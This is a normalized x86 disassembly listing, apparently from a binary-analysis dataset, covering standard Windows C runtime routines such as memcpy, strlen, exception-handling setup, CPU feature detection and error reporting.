movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_410438 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_410750
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_4107db
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x20
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
pop edi
pop esi
test eax eax
je r-xdata
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test [ eax ] 0x10
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov eax [ ecx ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0xc ] 0x1994000
sub_410868
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_41089b
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_4108d1
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_410907
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_410940
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_40e09b
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_417be2
add esp 0x20
pop esi
pop ebp
retn
sub_410971
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_40e09b
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_417be2
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_410a73
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_410bf7
pop ebx
leave
retn
sub_410a0e
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_410940
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_416f50
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_410a73
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] sub_410971
mov eax [ rw-data ]
lea ecx [ ebp - 0x38 ]
xor eax ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
call sub_415d5f
mov eax [ eax + 0x80 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x8 ]
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x38 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x4 ]
sub_410b48
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
mov ecx [ eax + 0x10 ]
push esi
mov esi [ eax + 0xc ]
push edi
mov [ ebp - 0x8 ] ecx
mov edi esi
mov [ ebp - 0x4 ] esi
test ebx ebx
js r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] edi
mov eax [ ebp + 0x8 ]
cmp edi [ eax + 0xc ]
ja r-xdata
mov edx [ ebp + 0x10 ]
call sub_4165c0
cmp esi edi
jbe r-xdata
dec esi
mov eax esi
imul eax eax 0x14
cmp [ eax + ecx + 0x4 ] edx
jge r-xdata
call sub_4165c0
imul esi esi 0x14
pop edi
lea eax [ ecx + esi ]
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp edx [ eax + ecx + 0x8 ]
jle r-xdata
test ebx ebx
jns r-xdata
mov edi [ ebp - 0x4 ]
dec ebx
mov [ ebp - 0x4 ] esi
cmp esi 0xffffffff
jne r-xdata
sub_410bc7
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_410bf7
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ RtlUnwind@IAT ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_410c4a
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
call sub_415d5f
mov ecx [ eax + 0x98 ]
mov [ esi + 0x4 ] ecx
call sub_415d5f
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_410c74
push ebp
mov ebp esp
push esi
call sub_415d5f
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_415d5f
mov ecx [ eax + 0x98 ]
jmp r-xdata
call sub_415d5f
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebp
jmp sub_4165c0
mov eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx eax
pop esi
pop ebp
retn
sub_410cc4
push ebp
mov ebp esp
call sub_415d5f
mov eax [ eax + 0x98 ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_410ced
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417be2
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_410d23
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
leave
retn
xor ecx ecx
mov eax ebx
mov [ rw-data ] ebx
cpuid
push esi
mov esi [ rw-data ]
push edi
lea edi [ ebp - 0x10 ]
or esi 0x2
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
test [ ebp - 0x8 ] 0x100000
mov [ rw-data ] esi
je r-xdata
test [ ebp - 0x8 ] 0x10000000
je r-xdata
or esi 0x4
mov [ rw-data ] 0x2
mov [ rw-data ] esi
push 0x7
xor ecx ecx
pop eax
cpuid
lea esi [ ebp - 0x10 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
test [ ebp - 0xc ] 0x200
mov esi [ rw-data ]
je r-xdata
or esi 0x8
mov [ rw-data ] 0x3
mov [ rw-data ] esi
xor eax eax
xor ecx ecx
cpuid
lea edi [ ebp - 0x10 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
cmp [ ebp - 0xc ] 0x756e6547
jne r-xdata
or esi 0x2
mov [ rw-data ] esi
pop edi
pop esi
cmp [ ebp - 0x4 ] 0x49656e69
jne r-xdata
cmp [ ebp - 0x8 ] 0x6c65746e
jne r-xdata
xor eax eax
inc eax
xor ecx ecx
cpuid
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x10 ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
or esi 0x1
mov [ rw-data ] esi
cmp eax 0x20660
je r-xdata
cmp eax 0x20670
je r-xdata
cmp eax 0x30650
je r-xdata
cmp eax 0x30660
je r-xdata
cmp eax 0x30670
jne r-xdata
sub_410e60
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
or eax 0x1
retn
test al al
je r-xdata
test al al
je r-xdata
add ecx 0x1
test al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
test ah ah
je r-xdata
test ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
test al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
test ah ah
jne r-xdata
mov edi edi
sub_410eec
push 0xc
push r--data
call sub_4110a0
push 0xe
call sub_4162e1
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410f54
call sub_4110e5
retn
mov ecx [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_40e8f2
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ ecx ] eax
jne r-xdata
mov edx ecx
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
push ecx
call sub_40e8f2
pop ecx
mov [ ebp - 0x1c ] ecx
test ecx ecx
je r-xdata
sub_410f5d
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_410f90
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_411550
mov [ eax ] 0x16
call sub_411714
or eax 0xffffffff
pop ebp
retn
sub_410fc1
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417dc9
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_41100b
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
xor esi esi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test edi edi
je r-xdata
push esi
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx edi
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0x8 ]
call sub_40e92a
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
sub_411054
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
mov esi eax
cmp eax [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417d1e
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_4110a0
push sub_411100
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_411100
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebx + 0x8 ]
xor edi [ rw-data ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
mov eax [ edi ]
lea esi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40e09b
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40e09b
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebx - 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_412f6b
lea eax [ eax + eax * 2 ]
lea eax [ eax + 0x4 ]
mov ecx [ edi + eax * 4 + 0x4 ]
mov ebx [ edi + eax * 4 ]
lea eax [ edi + eax * 4 ]
mov [ ebp - 0x10 ] eax
test ecx ecx
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x8 ]
add ecx esi
xor ecx [ edx + esi ]
call sub_40e09b
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40e09b
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_412f22
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov eax ebx
mov [ ebp - 0x8 ] ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_412f52
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
cmp [ eax + 0xc ] edx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push esi
mov ecx eax
call sub_412f6b
mov eax [ ebp + 0xc ]
push r--data
call sub_4164b0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40e09b
mov ecx [ ebp - 0x10 ]
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_412f39
int3
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call [ r--data ]
add esp 0x8
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_40e09b
sub_411295
push 0x3
call sub_416dce
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_4112f2
push 0xff
call sub_4112f2
pop ecx
pop ecx
push 0x3
call sub_416dce
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_4112ce
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x17
jb r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_4112f2
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_4112ce
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40e09b
leave
retn
push ebx
push 0x3
call sub_416dce
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x3
call sub_416dce
pop ecx
test eax eax
jne r-xdata
pop ebx
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor ebx ebx
mov ecx ebx
push r--data
push 0x314
push rw-data
call sub_40ea28
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_410750
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc ecx
cmp ecx 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_411724
int3
push 0x104
push rw-data
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi 0x2fb
test eax eax
jne r-xdata
mov al [ edi + ecx * 2 ]
mov [ ebp + ecx - 0x1f8 ] al
cmp [ edi + ecx * 2 ] bx
je r-xdata
push rw-data
call sub_417e43
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push esi
push rw-data
call sub_40ea28
add esp 0xc
test eax eax
jne r-xdata
push r--data
push 0x314
mov esi rw-data
push esi
call sub_40e9bc
add esp 0xc
test eax eax
jne r-xdata
push rw-data
call sub_417e43
lea ecx [ eax * 2 + rw-data ]
mov eax ecx
sub eax rw-data
push 0x3
sar eax 0x1
push r--data
sub esi eax
push esi
push ecx
call sub_40f45d
add esp 0x14
test eax eax
jne r-xdata
push edi
push 0x314
push esi
call sub_40e9bc
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push esi
call sub_417e5e
add esp 0xc
jmp r-xdata
sub_4114cc
call sub_41665d
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_416686
pop ecx
push 0x3
call sub_40fd7c
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_4115b9
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_41152f
push ebp
mov ebp esp
push esi
call sub_41151c
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_411563
pop ecx
mov esi eax
call sub_411550
mov [ eax ] esi
pop esi
pop ebp
retn
sub_411563
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x2d
jb r-xdata
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_4115b9
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_414160
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
mov edi eax
lea eax [ ebp - 0x328 ]
push eax
call sub_4150bc
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_414d74
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40e09b
leave
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_414d74
pop ecx
sub_4116e9
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411724
int3
pop ebp
jmp eax
sub_411724
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_4115b9
push esi
call sub_4150a7
add esp 0x10
pop esi
